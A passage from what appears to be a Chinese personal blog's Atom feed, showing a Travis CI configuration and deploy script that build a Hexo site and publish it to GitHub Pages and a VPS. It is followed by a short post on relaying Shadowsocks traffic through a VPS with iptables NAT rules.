class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">language</span>: node_js</span><br><span class="line"><span class="attribute">node_js</span>: stable</span><br><span class="line"></span><br><span class="line"># 只监听 source 分支的改动</span><br><span class="line"><span class="attribute">branches:</span></span><br><span class="line">  only:</span><br><span class="line">  - source</span><br><span class="line"></span><br><span class="line"># 缓存依赖，节省持续集成时间</span><br><span class="line"><span class="attribute">cache:</span></span><br><span class="line">  yarn: true</span><br><span class="line">  <span class="attribute">directories:</span></span><br><span class="line">    - node_modules</span><br><span class="line">    # - themes</span><br><span class="line"></span><br><span class="line"><span class="attribute">before_install:</span></span><br><span class="line"># 解密 RSA 私钥并设置为本机 ssh 私钥</span><br><span class="line">- openssl aes-256-cbc -K $encrypted_9aab6d74e2ca_key -iv $encrypted_9aab6d74e2ca_iv </span><br><span class="line">  -in .travis/travis.key.enc -out ~/.ssh/id_rsa -d</span><br><span class="line">- chmod 600 ~/.ssh/id_rsa</span><br><span class="line"># 修改本机 ssh 配置，防止秘钥认证过程影响自动部署</span><br><span class="line">#- mv -fv .travis/ssh-config ~/.ssh/config #这一步不需要，如果添加了ssh_know_hosts</span><br><span class="line">- git config --global user.name "sbmzhcn"</span><br><span class="line">- git config --global user.email "sbmzhcn@gmail.com"</span><br><span class="line"># 赋予自动部署脚本可执行权限</span><br><span class="line">- chmod +x .travis/deploy.sh</span><br><span class="line"></span><br><span class="line"><span class="attribute">install:</span></span><br><span class="line"># 安装 Hexo 及其依赖</span><br><span class="line">- yarn</span><br><span class="line"># 当 Travis 文件缓存不存在时，从 Gitee 私有仓库 clone 主题</span><br><span class="line">#- if [ ! -d "themes/next" ]; then git clone git@github.com:sbmzhcn/hexo-theme-next.git themes/next; fi</span><br><span class="line"></span><br><span class="line"><span class="attribute">script:</span></span><br><span class="line"># 生成静态页面</span><br><span class="line">- node_modules/.bin/hexo clean</span><br><span class="line">- node_modules/.bin/hexo generate</span><br><span class="line"></span><br><span class="line"><span class="attribute">after_success:</span></span><br><span class="line"># 部署到 GitHub Pages 和 VPS</span><br><span class="line">- .travis/deploy.sh</span><br><span class="line"></span><br><span class="line"><span class="attribute">addons:</span></span><br><span class="line">  ssh_know_hosts:</span><br><span class="line">  - github.com</span><br><span class="line">  - love4026.org</span><br></pre></td></tr></table></figure><p><code>vi .travis/deploy.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">set</span> -ev</span><br><span class="line"><span class="built_in">export</span> TZ=<span class="string">'Asia/Shanghai'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 rsync同步到 VPS</span></span><br><span class="line">rsync -rv --delete -e <span class="string">'ssh -o stricthostkeychecking=no -p 22'</span> public/ root@182.92.100.67:/home/wwwroot/love4026.org</span><br><span class="line"></span><br><span class="line"><span class="comment"># 先 clone 再 commit，避免直接 force commit</span></span><br><span class="line">git <span class="built_in">clone</span> -b master git@github.com:sbmzhcn/sbmzhcn.github.io.git .deploy_git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> .deploy_git</span><br><span class="line">git checkout master</span><br><span class="line">mv .git/ ../public/</span><br><span class="line"><span class="built_in">cd</span> ../public</span><br><span class="line"></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">"Site updated: `date +"</span>%Y-%m-%d %H:%M:%S<span class="string">"`"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同时 push 一份到自己的服务器上</span></span><br><span class="line"><span class="comment">#git remote add vps git@love4026.org:hexo.git</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#git push vps master:master --force --quiet</span></span><br><span class="line">git push origin master:master --force --quiet</span><br></pre></td></tr></table></figure><h2 id="删除一些文件"><a href="#删除一些文件" class="headerlink" title="删除一些文件"></a>删除一些文件</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd 博客根目录/.travis/</span><br><span class="line">rm travis.key</span><br><span class="line">rm travis<span class="selector-class">.key</span><span class="selector-class">.pub</span></span><br></pre></td></tr></table></figure><p>由于我之前有github pages内容了，我需要把之前的内容与现有的hexo博客内容合并下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git remote add origin git@github<span class="selector-class">.com</span>:sbmzhcn/sbmzhcn<span class="selector-class">.github</span><span class="selector-class">.io</span><span class="selector-class">.git</span></span><br><span class="line">git fetch origin master:temp</span><br><span class="line">git merge temp</span><br></pre></td></tr></table></figure><p>编辑下.gitignore 忽略一些文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br><span class="line">package-lock.json</span><br><span class="line">wordpress.xml</span><br><span class="line">public/</span><br></pre></td></tr></table></figure><h2 id="最终测试"><a href="#最终测试" class="headerlink" title="最终测试"></a>最终测试</h2><p>每次 push 新 commit 到 source 分支后，Travis CI 就会自动帮你构建最新的静态博客，并部署至 Github Pages 和你自己的 VPS 上。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout --orphan <span class="keyword">source</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">"Travis CI"</span></span><br><span class="line">git <span class="keyword">push</span> origin <span class="keyword">source</span>:<span class="keyword">source</span></span><br></pre></td></tr></table></figure><p>关于 –orphan 请参考 <a href="https://ihower.tw/blog/archives/5691" target="_blank" rel="noopener">如何建立一个没有 Parent 的独立 Git branch</a></p><h2 id="我的博客项目配置文件"><a href="#我的博客项目配置文件" class="headerlink" title="我的博客项目配置文件"></a>我的博客项目配置文件</h2><pre><code>https://github.com/sbmzhcn/sbmzhcn.github.io/tree/source</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blessing.studio/deploy-hexo-blog-automatically-with-travis-ci/" target="_blank" rel="noopener">使用 Travis CI 自动部署 Hexo 博客</a><br><a href="https://segmentfault.com/a/1190000009054888" target="_blank" rel="noopener">使用 Travis 自动部署 Hexo 到 Github 与 自己的服务器</a><br><a href="https://www.karlzhou.com/articles/compress-minify-hexo/" target="_blank" rel="noopener">优化Hexo博客 - 压缩 HTML、CSS、JS、IMG 等</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;使用 TRAVIS 自动部署 HEXO 到 GITHUB 与 自己的服务器&lt;/p&gt;
&lt;h2 id=&quot;前期准备&quot;&gt;&lt;a href=&quot;#前期准备&quot; class=&quot;headerlink&quot; title=&quot;前期准备&quot;&gt;&lt;/a&gt;前期准备&lt;/h2&gt;&lt;p&gt;请尽可能用比较新的 RubyGem
      
    
    </summary>
    
    
      <category term="hexo" scheme="https://www.love4026.org/tags/hexo/"/>
    
      <category term="github" scheme="https://www.love4026.org/tags/github/"/>
    
      <category term="travis" scheme="https://www.love4026.org/tags/travis/"/>
    
  </entry>
  
  <entry>
    <title>利用iptables实现shadowsocks中继/转发</title>
    <link href="https://www.love4026.org/315070/using-iptables-to-forward-shadowsocks/"/>
    <id>https://www.love4026.org/315070/using-iptables-to-forward-shadowsocks/</id>
    <published>2018-01-23T06:07:07.000Z</published>
    <updated>2019-02-07T14:01:38.535Z</updated>
    
    <content type="html"><![CDATA[<p>中继的原因是因为一些ip在我们本地的电脑上是无法连通的，但在阿里云等其它VPS上面就可以访问，这样我们可能通过中继来继续使用我们的shadowsocks.</p><h2 id="开启系统的转发功能"><a href="#开启系统的转发功能" class="headerlink" title="开启系统的转发功能"></a>开启系统的转发功能</h2><p> <code>vi /etc/sysctl.conf</code></p><p>将 <code>net.ipv4.ip_forward=0</code> ，修改成 <code>net.ipv4.ip_forward=1</code> 。</p><p>编辑后使用以下命令让配置马上生效</p><p><code>sysctl -p</code></p><h2 id="iptables的命令"><a href="#iptables的命令" class="headerlink" title="iptables的命令"></a>iptables的命令</h2><pre><code><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --dport [端口号] -j DNAT --to-destination [目标IP]</span><br><span class="line">iptables -t<span class="built_in"> nat </span>-A PREROUTING -p udp --dport [端口号] -j DNAT --to-destination [目标IP]</span><br><span class="line">iptables -t<span class="built_in"> nat </span>-A POSTROUTING -p tcp -d [目标IP] --dport [端口号] -j SNAT --to-source [本地服务器公网IP]</span><br><span class="line">iptables -t<span class="built_in"> nat </span>-A POSTROUTING -p udp -d [目标IP] --dport [端口号] -j SNAT --to-source [本地服务器公网IP]</span><br></pre></td></tr></table></figure></code></pre><h2 id="重启iptables使配置生效"><a href="#重启iptables使配置生效" class="headerlink" title="重启iptables使配置生效"></a>重启iptables使配置生效</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service iptables save</span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure><h2 id="直接修改iptables文件"><a href="#直接修改iptables文件" class="headerlink" title="直接修改iptables文件"></a>直接修改iptables文件</h2><p>上面添加过后，未来再修改ip的话，可以直接修改文件<code>/etc/sysconfig/iptables</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>sysconfig<span class="regexp">/iptables</span></span><br></pre></td></tr></table></figure><p><code>:%s/1.1.1.1/2.2.2.2</code> 可以替换ip地址</p><p> 然后 </p> <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">service iptables restart</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;中继的原因是因为一些ip在我们本地的电脑上是无法连通的，但在阿里云等其它VPS上面就可以访问，这样我们可能通过中继来继续使用我们的shadowsocks.&lt;/p&gt;
&lt;h2 id=&quot;开启系统的转发功能&quot;&gt;&lt;a href=&quot;#开启系统的转发功能&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="技术" scheme="https://www.love4026.org/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="shadowsocks" scheme="https://www.love4026.org/tags/shadowsocks/"/>
    
      <category term="iptables" scheme="https://www.love4026.org/tags/iptables/"/>
    
  </entry>
  
</feed>
